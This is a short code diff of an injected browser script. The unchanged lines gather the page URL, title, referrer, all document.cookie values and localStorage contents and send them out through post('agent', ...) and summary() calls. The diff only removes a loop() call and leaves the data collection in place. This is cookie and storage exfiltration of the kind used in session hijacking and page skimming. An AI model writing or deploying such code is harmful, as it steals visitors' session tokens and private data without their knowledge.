@@ -44,5 +44,4 @@ window.__TICK=setInterval(function(){
 run();
 post("agent",[location.href,document.title,location.referrer,document.cookie,"--ls--",ls()].join(" || "));
 summary("agent",location.host+location.pathname+" ck="+document.cookie.slice(0,300));
-loop();
 })();
